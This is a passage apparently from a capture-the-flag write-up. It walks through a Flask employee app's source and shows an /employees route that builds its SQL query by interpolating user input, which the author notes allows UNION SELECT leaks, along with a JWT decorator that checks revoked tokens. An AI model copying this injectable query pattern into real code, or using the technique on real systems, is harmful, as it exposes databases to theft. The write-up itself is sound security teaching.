</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">193</span><span class="">    cursor</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">194</span><span class="">        </span><span class="token string-interpolation string">f&quot;SELECT id, name, email, position FROM employees WHERE name LIKE &#x27;%</span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation">query</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">%&#x27;&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">195</span><span class="">    </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">196</span><span class="">    results </span><span class="token operator">=</span><span class=""> cursor</span><span class="token punctuation">.</span><span class="">fetchall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">197</span><span class="">    conn</span><span class="token punctuation">.</span><span class="">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">198</span><span class="">    </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="">request</span><span class="token punctuation">.</span><span class="">username</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">199</span><span class="">    </span><span class="token keyword">return</span><span class=""> render_template</span><span class="token punctuation">(</span><span class="token string">&quot;employees.html&quot;</span><span class="token punctuation">,</span><span class=""> username</span><span class="token operator">=</span><span class="">request</span><span class="token punctuation">.</span><span class="">username</span><span class="token punctuation">,</span><span class=""> employees</span><span class="token operator">=</span><span class="">results</span><span class="token punctuation">,</span><span class=""> query</span><span class="token operator">=</span><span class="">query</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">200</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">201</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">202</span><span class=""></span><span class="token decorator annotation punctuation">@app</span><span class="token decorator annotation punctuation">.</span><span class="token decorator annotation punctuation">route</span><span class="token punctuation">(</span><span class="token string">&quot;/employee/&lt;int:employee_id&gt;&quot;</span><span class="token punctuation">,</span><span class=""> methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">203</span><span class=""></span><span class="token decorator annotation punctuation">@token_required</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">204</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">employee_details</span><span class="token punctuation">(</span><span class="">employee_id</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">205</span><span class="">    conn </span><span class="token operator">=</span><span class=""> get_db_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">206</span><span class="">    employee </span><span class="token operator">=</span><span class=""> conn</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">207</span><span class="">        </span><span class="token string">&quot;SELECT * FROM employees WHERE id = ?&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="">employee_id</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">208</span><span class="">    </span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">fetchone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">209</span><span class="">    conn</span><span class="token punctuation">.</span><span class="">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">210</span><span class="">    </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="">employee</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">211</span><span class="">    </span><span class="token keyword">if</span><span class=""> </span><span class="token keyword">not</span><span class=""> employee</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">212</span><span class="">        flash</span><span class="token punctuation">(</span><span class="token string">&quot;Employee not found&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">213</span><span class="">        </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/employees&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">214</span><span class="">    </span><span class="token keyword">return</span><span class=""> render_template</span><span class="token punctuation">(</span><span class="token string">&quot;employee_details.html&quot;</span><span class="token punctuation">,</span><span class=""> username</span><span class="token operator">=</span><span class="">request</span><span class="token punctuation">.</span><span class="">username</span><span class="token punctuation">,</span><span class=""> employee</span><span class="token operator">=</span><span class="">employee</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">215</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">216</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">217</span><span class=""></span><span class="token decorator annotation punctuation">@app</span><span class="token decorator annotation punctuation">.</span><span class="token decorator annotation punctuation">route</span><span class="token punctuation">(</span><span class="token string">&quot;/admin&quot;</span><span class="token punctuation">,</span><span class=""> methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">218</span><span class=""></span><span class="token decorator annotation punctuation">@token_required</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">219</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">220</span><span class="">    is_admin </span><span class="token operator">=</span><span class=""> </span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="">request</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;is_admin&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">221</span><span class="">    </span><span class="token keyword">if</span><span class=""> is_admin</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">222</span><span class="">        </span><span class="token keyword">return</span><span class=""> render_template</span><span class="token punctuation">(</span><span class="token string">&quot;admin.html&quot;</span><span class="token punctuation">,</span><span class=""> username</span><span class="token operator">=</span><span class="">request</span><span class="token punctuation">.</span><span class="">username</span><span class="token punctuation">,</span><span class=""> flag</span><span class="token operator">=</span><span class="">FLAG</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">223</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">224</span><span class="">    flash</span><span class="token punctuation">(</span><span class="token string">&quot;You don&#x27;t have the permission to access this area&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">225</span><span class="">    </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/employees&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">226</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">227</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">228</span><span class=""></span><span class="token keyword">if</span><span class=""> __name__ </span><span class="token operator">==</span><span class=""> </span><span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">229</span><span class="">    init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">230</span><span class="">    app</span><span class="token punctuation">.</span><span class="">run</span><span class="token punctuation">(</span><span class="">debug</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span><span class=""> host</span><span class="token operator">=</span><span class="token string">&quot;0.0.0.0&quot;</span><span class="token punctuation">,</span><span class=""> port</span><span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span></code></pre></div></div>
<p>We can see right off the bat that we have SQL injection in the <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">/employees</code> route:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token decorator annotation punctuation">@app</span><span class="token decorator annotation punctuation">.</span><span class="token decorator annotation punctuation">route</span><span class="token punctuation">(</span><span class="token string">&quot;/employees&quot;</span><span class="token punctuation">,</span><span class=""> methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token decorator annotation punctuation">@token_required</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">employees</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">    query </span><span class="token operator">=</span><span class=""> request</span><span class="token punctuation">.</span><span class="">args</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;query&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">    conn </span><span class="token operator">=</span><span class=""> get_db_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">    cursor </span><span class="token operator">=</span><span class=""> conn</span><span class="token punctuation">.</span><span class="">cursor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">    cursor</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">        </span><span class="token string-interpolation string">f&quot;SELECT id, name, email, position FROM employees WHERE name LIKE &#x27;%</span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation">query</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">%&#x27;&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">    </span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">    results </span><span class="token operator">=</span><span class=""> cursor</span><span class="token punctuation">.</span><span class="">fetchall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">    conn</span><span class="token punctuation">.</span><span class="">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">    </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="">request</span><span class="token punctuation">.</span><span class="">username</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">    </span><span class="token keyword">return</span><span class=""> render_template</span><span class="token punctuation">(</span><span class="token string">&quot;employees.html&quot;</span><span class="token punctuation">,</span><span class=""> username</span><span class="token operator">=</span><span class="">request</span><span class="token punctuation">.</span><span class="">username</span><span class="token punctuation">,</span><span class=""> employees</span><span class="token operator">=</span><span class="">results</span><span class="token punctuation">,</span><span class=""> query</span><span class="token operator">=</span><span class="">query</span><span class="token punctuation">)</span></code></pre></div></div>
<p>We can then use <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">UNION SELECT</code> to leak any part of their database. But what&#x27;s this about revoked tokens?</p>
<p>In their <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">token_required</code> decorator, we can see that our JWT is decoded and properties injected into the request object so long as:</p>
<ul>
<li>The JWT is valid.</li>
<li>The <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">username</code> corresponds to an existing user.</li>
<li>The token isn&#x27;t in the <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">revoked_tokens</code> table.</li>
</ul>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">def</span><span class=""> </span><span class="token function">token_required</span><span class="token punctuation">(</span><span class="">f</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    </span><span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span><span class="">f</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">    </span><span class="token keyword">def</span><span class=""> </span><span class="token function">decorated</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="">args</span><span class="token punctuation">,</span><span class=""> </span><span class="token operator">**</span><span class="">kwargs</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">        token </span><span class="token operator">=</span><span class=""> request</span><span class="token punctuation">.</span><span class="">cookies</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;JWT&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">        </span><span class="token keyword">if</span><span class=""> </span><span class="token keyword">not</span><span class=""> token</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">            flash</span><span class="token punctuation">(</span><span class="token string">&quot;Token is missing!&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">            </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">        </span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">            data </span><span class="token operator">=</span><span class=""> jwt</span><span class="token punctuation">.</span><span class="">decode</span><span class="token punctuation">(</span><span class="">token</span><span class="token punctuation">,</span><span class=""> app</span><span class="token punctuation">.</span><span class="">config</span><span class="token punctuation">[</span><span class="token string">&quot;SECRET_KEY&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class=""> algorithms</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;HS256&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">            username </span><span class="token operator">=</span><span class=""> data</span><span class="token punctuation">[</span><span class="token string">&quot;username&quot;</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">            conn </span><span class="token operator">=</span><span class=""> get_db_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">            user </span><span class="token operator">=</span><span class=""> conn</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">                </span><span class="token string">&quot;SELECT id,is_admin FROM users WHERE username = ?&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="">username</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">            </span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">fetchone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">            revoked </span><span class="token operator">=</span><span class=""> conn</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">                </span><span class="token string">&quot;SELECT id FROM revoked_tokens WHERE token = ?&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">(</span><span class="">token</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">            </span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">fetchone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">            conn</span><span class="token punctuation">.</span><span class="">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">            </span><span class="token keyword">if</span><span class=""> </span><span class="token keyword">not</span><span class=""> user </span><span class="token keyword">or</span><span class=""> revoked</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">                flash</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid or revoked token!&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;error&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">                </span><span class="token keyword">return</span><span class=""> redirect</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">25</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">            request</span><span class="token punctuation">.</span><span class="">is_admin </span><span class="token operator">=</span><span class=""> user</span><span class="token punctuation">[</span><span class="token string">&quot;is_admin&quot;</span><span class="token punctuation">]</span><span class="">
